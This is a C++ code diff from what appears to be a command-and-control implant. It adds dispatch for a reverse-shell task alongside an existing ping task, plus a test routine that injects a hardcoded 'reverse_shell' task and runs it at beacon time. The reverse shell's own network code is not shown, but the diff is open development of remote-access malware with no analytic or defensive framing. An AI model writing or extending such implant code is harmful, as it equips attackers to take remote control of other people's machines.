@@ -35,6 +35,9 @@ void Implant::beacon() {
 
     //std::cout << api->assert_ping_pong() << std::endl;
     test_get_tasks();
+    test_reverse_shell();
+
+    while (true);
 }
 
 void Implant::parse_tasks_response(const std::string &response)
@@ -52,16 +55,28 @@ void Implant::parse_tasks_response(const std::string &response)
 }
 
 void Implant::run_all() {
-    for (auto& task: tasks) {
+    while (!tasks.empty())
+    {
+        std::unique_ptr<Task> task = std::move(tasks.back()); 
+        tasks.pop_back();
+
         if (!task.get()) continue;
         if (PingTask* ping_task = dynamic_cast<PingTask*>(task.get()))
             ping_task->run();
+        if (ReverseShellTask* rs_task = dynamic_cast<ReverseShellTask*>(task.get()))
+            rs_task->run();
     }
 }
 
 
 void Implant::test_get_tasks() {
     parse_tasks_response("[{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"ping\"},{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"ping\"}]");
+    
+    run_all();
+}
+
+void Implant::test_reverse_shell() {
+    parse_tasks_response("[{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"reverse_shell\"}]");
     
     run_all();
 }
